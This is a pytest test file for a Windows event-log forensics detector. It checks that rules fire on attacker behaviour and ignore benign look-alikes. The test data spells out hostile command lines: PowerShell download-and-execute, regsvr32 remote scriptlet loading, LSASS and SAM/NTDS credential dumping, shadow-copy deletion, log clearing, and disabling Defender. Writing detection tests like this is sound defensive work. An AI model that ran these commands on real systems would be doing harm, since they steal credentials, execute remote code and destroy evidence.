"""Windows behaviour rules: each fires on the behaviour and not on a near look-alike."""

from __future__ import annotations

import pytest

from auto_forensics.models import ArtifactEvent
from auto_forensics.windows_rules import RULES, WindowsRuleDetector, rule_matches

SHA = "a" * 64
SYSMON = "Microsoft-Windows-Sysmon"
RULE = {rule.rule_id: rule for rule in RULES}


def ev(event_id: int, provider: str = SYSMON, row: int = 1, **fields: str) -> ArtifactEvent:
    meta = {"event_id": event_id, "provider": provider, "channel": "", "source_file": "x.evtx",
            "source_sha256": SHA, "row": row}
    meta.update(fields)
    return ArtifactEvent(artifact_id=f"e{row}", timestamp=None, event_type=f"windows_event_{event_id}",
                         description="", source="x.evtx", metadata=meta)


HITS = [
    ("ps-encoded", ev(1, Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                      CommandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")),
    ("ps-download", ev(4688, "Microsoft-Windows-Security-Auditing", NewProcessName=r"C:\x\powershell.exe",
                       CommandLine="powershell IEX (New-Object Net.WebClient).DownloadString('http://x/a')")),
    ("script-from-office", ev(1, ParentImage=r"C:\Program Files\Microsoft Office\WINWORD.EXE",
                              Image=r"C:\Windows\System32\cmd.exe", CommandLine="cmd /c whoami")),
    ("lolbin-proxy", ev(1, Image=r"C:\Windows\System32\regsvr32.exe",
                        CommandLine="regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll")),
    ("wmi-spawn", ev(1, ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\upd")),
    ("registry-ifeo", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution "
                                          r"Options\sethc.exe\Debugger")),
    ("uac-bypass-registry", ev(13, TargetObject=r"HKU\S-1\Software\Classes\ms-settings\shell\open\command\(Default)")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\procdump64.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\Desktop\mimikatz.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00001010")),
    ("lsass-handle", ev(4656, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Device\HarddiskVolume1\Windows\System32\lsass.exe",
                        AccessMask="0x001f3fff", ProcessName=r"C:\Windows\System32\cscript.exe")),
    ("lsass-writes-file", ev(11, Image=r"C:\Windows\system32\lsass.exe", TargetFilename=r"C:\Windows\System32\mimilsa.log")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x\helper.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x0000147a")),
    ("lsass-access", ev(10, SourceImage=r"c:\python27\python.exe", TargetImage=r"C:\Windows\system32\lsass.exe",
                        GrantedAccess="0x00101ffb")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\System32\dllhost.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Users\a\Desktop\tool.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("autoelevate-dll-hijack", ev(7, Image=r"C:\Windows\System32\mmc.exe",
                                  ImageLoaded=r"C:\Users\a\AppData\Local\Temp\pe386.dll")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\wuauclt.exe", ImageLoaded=r"C:\Users\Public\x.dll")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000000)")),
    ("ps-logging-disabled", ev(12, TargetObject=r"HKLM\System\CurrentControlSet\Control\SESSION MANAGER\Environment"
                                                r"\__PSLockdownPolicy")),
    ("port-proxy", ev(13, TargetObject=r"HKLM\System\CurrentControlSet\services\PortProxy\v4tov4\tcp\1.2.3.4/8001")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\hideme0007$\(Default)")),
    ("lolbin-proxy", ev(1, CommandLine=r'"C:\Windows\System32\rundll32.exe" zipfldr.dll,RouteTheCall c:\x\calc.exe')),
    ("lolbin-proxy", ev(1, CommandLine="desktopimgdownldr.exe /lockscreenurl:https://x/a.7z /eventName:x")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\windows\temp\icon.ico')),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\Internet Explorer\iexplore.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Program Files\MSSQL\Binn\sqlservr.exe",
                            Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\RoguePotato\pipe\epmapper")),
    ("getsystem-pipe", ev(1, CommandLine=r"cmd.exe /c echo msdhch > \\.\pipe\msdhch")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="xp_cmdshell | 0 | 1")),
    ("winrm-shell", ev(91, "Microsoft-Windows-WinRM")),
    ("bits-job", ev(59, "Microsoft-Windows-Bits-Client", url="https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z")),
    ("bits-job", ev(59, "Microsoft-Windows-Bits-Client", url=r"C:\Windows\system32\cmd.exe")),
    ("silent-exit-lsass", ev(3001, "Microsoft-Windows-ProcessExitMonitor", param1=r"C:\Windows\System32\lsass.exe")),
    ("boot-debug-signing", ev(4826, "Microsoft-Windows-Security-Auditing", KernelDebug="%%1842", TestSigning="%%1843")),
    ("eventlog-service-down", ev(7036, "Service Control Manager", param1="Windows Event Log", param2="stopped")),
    ("sedebug-enabled", ev(4703, "Microsoft-Windows-Security-Auditing", EnabledPrivilegeList="SeDebugPrivilege",
                           ProcessName=r"C:\Users\IEUser\Desktop\x64\mimikatz.exe")),
    ("local-group-enum", ev(4799, "Microsoft-Windows-Security-Auditing", SubjectUserName="jbrown",
                            CallerProcessName=r"C:\Windows\System32\net1.exe")),
    ("psh-obfuscation", ev(800, "PowerShell", Data="&('ne'+'w-'+'item') $eNV:teMP -itemtype DIrectOry;[x]::\"SecURi`T`ypRO`T`oCOL\"")),
    ("mssql-sa-failure", ev(18456, "MSSQLSERVER", Data="sa | Reason: Password did not match")),
    ("compile-after-delivery", ev(1, Image=r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                                  ParentImage=r"C:\Windows\System32\cmd.exe",
                                  CommandLine=r"csc.exe /unsafe /nologo /target:exe /out:zoom-update.exe C:\Users\a\x.cs")),
    ("ps-downgrade", ev(400, "PowerShell", Data="Available | None | HostVersion=2.0\n\tEngineVersion=2.0")),
    ("cve-exploit-audit", ev(1, "Microsoft-Windows-Audit-CVE", CVEID="[CVE-2020-0601] cert validation")),
    ("ad-delegation-set", ev(4742, "Microsoft-Windows-Security-Auditing", AllowedToDelegateTo="cifs/dc01.corp.local")),
    ("ad-dcshadow-spn", ev(4742, "Microsoft-Windows-Security-Auditing", ServicePrincipalNames="GC/ws01.corp.local/corp.local")),
    ("ad-sensitive-attribute", ev(5136, "Microsoft-Windows-Security-Auditing", AttributeLDAPDisplayName="msDS-KeyCredentialLink")),
    ("ad-adminsdholder", ev(5136, "Microsoft-Windows-Security-Auditing", ObjectDN="CN=AdminSDHolder,CN=System,DC=corp,DC=local")),
    ("gpp-password-read", ev(5145, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\SYSVOL",
                             RelativeTargetName=r"corp.local\Policies\{X}\Machine\Preferences\Groups\Groups.xml")),
    ("ntds-sam-file-access", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"C:\Windows\NTDS\ntds.dit", ProcessName=r"C:\Temp\x.exe")),
    ("lsass-access", ev(10, SourceImage=r"C:\Users\a\Downloads\CSFalconService.exe",
                        TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1010")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                            Details=r"C:\Program Files\Updater\up.exe -c powershell -enc AAAA")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\x",
                            Details=r"C:\Users\a\AppData\Roaming\svc\svchost.exe")),
    ("user-writable-network", ev(3, Image=r"C:\Users\a\AppData\Roaming\svc\svchost.exe", DestinationPort="443")),
    ("cmd-obfuscation", ev(1, CommandLine=r"c^m^d /c p^o^w^e^r^s^h^e^l^l -c whoami")),
    ("cmd-obfuscation", ev(1, CommandLine=r"cmd /c %COMSPEC:~-7,1%%COMSPEC:~-16,1%%COMSPEC:~-5,1%%COMSPEC:~4,1%")),
    ("cmd-obfuscation", ev(1, CommandLine=r'c""m""d""e /c whoami')),
    ("lsass-dump-cmd", ev(1, CommandLine=r"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\t\l.dmp full")),
    ("hive-dump", ev(1, CommandLine=r"reg save HKLM\SAM C:\temp\sam.save")),
    ("ntds-dump", ev(1, CommandLine='ntdsutil "ac i ntds" "ifm" "create full c:\\temp" q q')),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="mallory",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="sqlsvc")),
    ("service-install-suspicious", ev(7045, "Service Control Manager",
                                      ImagePath=r"%COMSPEC% /C echo whoami > \\127.0.0.1\C$\x.txt")),
    ("psexec-pipe", ev(17, PipeName=r"\PSEXESVC")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="9", LogonProcessName="seclogo")),
    ("admin-share-write", ev(5145, "Microsoft-Windows-Security-Auditing", ShareName=r"\\*\ADMIN$",
                             RelativeTargetName="PSEXESVC.exe")),
    ("log-cleared-cmd", ev(1, CommandLine="wevtutil cl Security")),
    ("shadow-delete", ev(1, CommandLine="vssadmin.exe delete shadows /all /quiet")),
    ("av-tamper", ev(1, CommandLine="powershell Set-MpPreference -DisableRealtimeMonitoring $true")),
    ("domain-discovery", ev(1, CommandLine="net group \"domain admins\" /domain")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="93.184.216.34",
                          DestinationPort="443")),
    ("psh-scriptblock", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Invoke-Mimikatz -DumpCreds")),
    ("wmi-subscription", ev(20)),
    ("masquerade-renamed", ev(1, Image=r"C:\Users\a\svch0st.exe", OriginalFileName="psexec.exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="10", IpAddress="127.0.0.1")),
    ("startup-file", ev(11, TargetFilename=r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
                                           r"\Startup\evil.lnk")),
    ("credential-dump-file", ev(11, TargetFilename=r"C:\Windows\Temp\lsass.dmp")),
]

MISSES = [
    # same field, ordinary value
    ("ps-encoded", ev(1, Image=r"C:\x\powershell.exe", CommandLine="powershell.exe -File C:\\scripts\\backup.ps1")),
    ("script-from-office", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("registry-autorun", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\x")),
    ("lsass-access", ev(10, SourceImage=r"C:\Windows\System32\svchost.exe", TargetImage=r"C:\Windows\lsass.exe",
                        GrantedAccess="0x1fffff")),
    ("lsass-access", ev(10, SourceImage=r"C:\a\x.exe", TargetImage=r"C:\Windows\lsass.exe", GrantedAccess="0x1000")),
    ("lsass-handle", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"\Windows\System32\lsass.exe",
                        AccessMask="0x00000004", ProcessName=r"C:\x\tool.exe")),
    ("process-memory-read", ev(10, SourceImage=r"C:\Users\b\AppData\Local\Temp\x.exe",
                               TargetImage=r"C:\Program Files\App\App.exe", GrantedAccess="0x00001000")),
    ("dcsync", ev(4662, "Microsoft-Windows-Security-Auditing", SubjectUserName="DC01$",
                  Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x12", ServiceName="sqlsvc")),
    ("kerberoast", ev(4769, "Microsoft-Windows-Security-Auditing", TicketEncryptionType="0x17", ServiceName="DC01$")),
    ("pth-logon", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="2", LogonProcessName="User32")),
    ("uac-com-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("lolbin-proxy", ev(1, CommandLine=r'"c:\windows\system32\wscript.exe" /E:vbs c:\scripts\logon.vbs')),
    ("lolbin-proxy", ev(1, CommandLine=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl")),
    ("odd-parent-shell", ev(1, ParentImage=r"C:\Windows\explorer.exe", Image=r"C:\Windows\System32\cmd.exe")),
    ("pipe-impersonation", ev(17, PipeName=r"\spoolss")),
    ("cmd-obfuscation", ev(1, CommandLine=r'"C:\Program Files\App\app.exe" --title "Q^3 report" --path %TEMP%')),
    ("cmd-obfuscation", ev(1, CommandLine=r"echo %DATE:~10,4%")),
    ("lsass-access", ev(10, SourceImage=r"C:\Program Files\CrowdStrike\CSFalconService.exe",
                        TargetImage=r"C:\Windows\system32\lsass.exe", GrantedAccess="0x1010")),
    ("registry-autorun", ev(13, TargetObject=r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
                            Details=r'"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background')),
    ("registry-autorun", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SecurityHealth",
                            Details=r"%windir%\system32\SecurityHealthSystray.exe")),
    ("user-writable-network", ev(3, Image=r"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDrive.exe",
                                 DestinationPort="443")),
    ("ad-delegation-set", ev(4742, "Microsoft-Windows-Security-Auditing", AllowedToDelegateTo="-")),
    ("ad-sensitive-attribute", ev(5136, "Microsoft-Windows-Security-Auditing", AttributeLDAPDisplayName="description")),
    ("ntds-sam-file-access", ev(4663, "Microsoft-Windows-Security-Auditing", ObjectName=r"C:\Windows\NTDS\ntds.dit",
                                ProcessName=r"C:\Windows\System32\lsass.exe")),
    ("ps-downgrade", ev(400, "PowerShell", Data="Available | None | EngineVersion=5.1.18362.145")),
    ("cve-exploit-audit", ev(1, SYSMON, CVEID="")),
    ("boot-debug-signing", ev(4826, "Microsoft-Windows-Security-Auditing", KernelDebug="%%1843", TestSigning="%%1843")),
    ("eventlog-service-down", ev(7036, "Service Control Manager", param1="Windows Event Log", param2="running")),
    ("sedebug-enabled", ev(4703, "Microsoft-Windows-Security-Auditing", EnabledPrivilegeList="SeDebugPrivilege",
                           ProcessName=r"C:\Windows\System32\svchost.exe")),
    ("psh-obfuscation", ev(4104, "Microsoft-Windows-PowerShell", ScriptBlockText="Get-ChildItem -Path C:\\logs | Sort-Object Length")),
    ("bits-job", ev(60, "Microsoft-Windows-Bits-Client", url="http://g.live.com/odclientsettings/ProdV2")),
    ("bits-job", ev(60, "Microsoft-Windows-Bits-Client",
                    url="http://r2---sn-5hne6nsr.gvt1.com/edgedl/release2/chrome/x_chrome_updater.exe")),
    ("mssql-xp-cmdshell", ev(15457, "MSSQLSERVER", Data="max server memory | 2048 | 4096")),
    ("uac-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\policies\system\EnableLUA",
                        Details="DWORD (0x00000001)")),
    ("ps-logging-disabled", ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
                                                r"\ScriptBlockLogging\EnableScriptBlockLogging", Details="DWORD (0x00000001)")),
    ("rid-hijack", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                      TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\000001F5\F")),
    ("hidden-account", ev(13, Image=r"C:\Windows\system32\lsass.exe",
                          TargetObject=r"HKLM\SAM\SAM\Domains\Account\Users\Names\bob\(Default)")),
    ("autoelevate-from-user-folder", ev(1, ParentImage=r"C:\Windows\explorer.exe",
                                        Image=r"C:\Windows\System32\eventvwr.exe")),
    ("dll-sideload", ev(7, Image=r"C:\Windows\System32\svchost.exe",
                        ImageLoaded=r"C:\Windows\System32\kernel32.dll")),
    ("lolbin-network", ev(3, Image=r"C:\Windows\System32\mshta.exe", DestinationIp="10.0.0.5", DestinationPort="443")),
    # Sysmon-only rules must not fire on another provider's event with the same ID
    ("registry-autorun", ev(13, "Some-Other-Provider", TargetObject=r"\CurrentVersion\Run\x")),
    ("wmi-subscription", ev(20, "Microsoft-Windows-Kernel-Power")),
    ("masquerade-renamed", ev(1, Image=r"C:\Windows\System32\cmd.exe", OriginalFileName="Cmd.Exe")),
    ("rdp-tunnel", ev(4624, "Microsoft-Windows-Security-Auditing", LogonType="5", IpAddress="127.0.0.1")),
]


@pytest.mark.parametrize("rule_id,event", HITS, ids=[h[0] for h in HITS])
def test_rule_fires(rule_id: str, event: ArtifactEvent) -> None:
    assert rule_matches(RULE[rule_id], event)


@pytest.mark.parametrize("rule_id,event", MISSES, ids=[f"not-{m[0]}" for m in MISSES])
def test_rule_ignores_look_alike(rule_id: str, event: ArtifactEvent) -> None:
    assert not rule_matches(RULE[rule_id], event)


def test_rule_ids_are_unique() -> None:
    assert len(RULE) == len(RULES)


def test_detector_reports_one_finding_per_rule_per_file_with_citation() -> None:
    events = [ev(1, row=i, CommandLine="vssadmin delete shadows /all") for i in range(1, 6)]
    findings = WindowsRuleDetector().detect(events, [], [])
    assert len(findings) == 1
    finding = findings[0]
    assert finding.citations[0].row == 1 and finding.citations[0].sha256 == SHA
    assert "4 more matching" in finding.recommendation
    assert all(item.split("=", 1)[0] in {"source", "artifact_id", "event_type"} for item in finding.evidence)


def test_event_without_citation_is_skipped() -> None:
    event = ev(1, CommandLine="vssadmin delete shadows /all")
    event.metadata.pop("source_sha256")
    assert WindowsRuleDetector().detect([event], [], []) == []


def test_parser_keeps_unnamed_data_and_userdata() -> None:
    from auto_forensics.artifacts import parse_evtx_xml_record

    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    sql = (f'<Event xmlns="{ns}"><System><Provider Name="MSSQLSERVER"/><EventID>15457</EventID></System>'
           "<EventData><Data>xp_cmdshell</Data><Data>0</Data><Data>1</Data></EventData></Event>")
    rdp = (f'<Event xmlns="{ns}"><System><Provider Name="TerminalServices"/><EventID>1149</EventID></System>'
           '<UserData><EventXML xmlns="Event_NS"><Param1>bob</Param1><Param3>127.0.0.1</Param3></EventXML>'
           "</UserData></Event>")
    first = parse_evtx_xml_record(sql, "a.evtx")
    second = parse_evtx_xml_record(rdp, "b.evtx")
    assert first is not None and first.metadata["Data"] == "xp_cmdshell | 0 | 1"
    assert second is not None and second.metadata["Param1"] == "bob" and second.metadata["Param3"] == "127.0.0.1"


def test_volume_rules_need_enough_events_and_accounts() -> None:
    detector = WindowsRuleDetector()
    sec = "Microsoft-Windows-Security-Auditing"
    few = [ev(4625, sec, row=i, TargetUserName="bob") for i in range(1, 5)]
    assert not [f for f in detector.detect(few, [], []) if f.title.startswith("Repeated failed")]
    def at(event: ArtifactEvent, second: int) -> ArtifactEvent:
        event.timestamp = f"2026-03-01T10:{second // 60:02d}:{second % 60:02d}.000Z"
        return event

    many = [at(ev(4625, sec, row=i, TargetUserName="bob"), i * 5) for i in range(1, 13)]
    found = [f for f in detector.detect(many, [], []) if f.title.startswith("Repeated failed")]
    assert len(found) == 1 and found[0].citations[0].row == 10
    assert not [f for f in detector.detect(many, [], []) if "spraying" in f.title]
    # The same twelve failures spread over a day are ordinary typos.
    spread = []
    for i in range(1, 13):
        event = ev(4625, sec, row=i, TargetUserName="bob")
        event.timestamp = f"2026-03-01T{8 + i % 10:02d}:{i:02d}:00.000Z"
        spread.append(event)
    assert not [f for f in detector.detect(spread, [], []) if f.title.startswith("Repeated failed")]
    spray = [at(ev(4625, sec, row=i, TargetUserName=f"user{i}", IpAddress="10.9.9.9"), i) for i in range(1, 7)]
    sprayed = [f for f in detector.detect(spray, [], []) if "spraying" in f.title]
    assert len(sprayed) == 1 and "6 accounts" in sprayed[0].recommendation
    no_time = [ev(4625, sec, row=i, TargetUserName=f"user{i}") for i in range(1, 7)]
    assert not [f for f in detector.detect(no_time, [], []) if "spraying" in f.title]


def test_recon_needs_a_burst_and_service_shell_needs_no_arguments() -> None:
    def at(event: ArtifactEvent, second: int) -> ArtifactEvent:
        event.timestamp = f"2026-03-01T10:00:{second:02d}.000Z"
        return event

    detector = WindowsRuleDetector()
    one = [at(ev(1, row=1, CommandLine="ipconfig /all", ParentImage=r"C:\Windows\System32\cmd.exe"), 1)]
    assert not [f for f in detector.detect(one, [], []) if "reconnaissance" in f.title]
    burst = [at(ev(1, row=i, CommandLine=cmd, ParentImage=r"C:\Windows\System32\cmd.exe"), i)
             for i, cmd in enumerate(["ipconfig /all", "systeminfo", "net share", "arp -a"], start=1)]
    assert [f for f in detector.detect(burst, [], []) if "reconnaissance" in f.title]
    rule = RULE["svchost-shell"]
    task = ev(1, ParentImage=r"C:\Windows\System32\svchost.exe", Image=r"C:\Windows\System32\cmd.exe",
              CommandLine=r"C:\Windows\system32\cmd.exe /c C:\scripts\nightly.bat")
    bare = ev(1, ParentImage=r"C:\Windows\System32\svchost.exe", Image=r"C:\Windows\System32\cmd.exe",
              CommandLine=r"C:\Windows\system32\cmd.exe")
    assert not rule_matches(rule, task) and rule_matches(rule, bare)


def test_registry_values_match_with_or_without_hex_padding() -> None:
    for details in ("DWORD (0x00000001)", "0x1"):
        assert rule_matches(RULE["office-macro-guard-off"], ev(13, TargetObject=r"HKU\S\Software\Microsoft\Office"
                                                                r"\16.0\Excel\Security\AccessVBOM", Details=details))
    for details in ("DWORD (0x00000000)", "0x0"):
        assert rule_matches(RULE["ps-logging-disabled"], ev(13, TargetObject=r"HKLM\SOFTWARE\Policies\Microsoft"
                                                             r"\Windows\PowerShell\ScriptBlockLogging"
                                                             r"\EnableScriptBlockLogging", Details=details))
    assert rule_matches(RULE["masquerade-renamed"], ev(1, Image=r"C:\Users\a\svc.exe", OriginalFileName="psexec.c"))
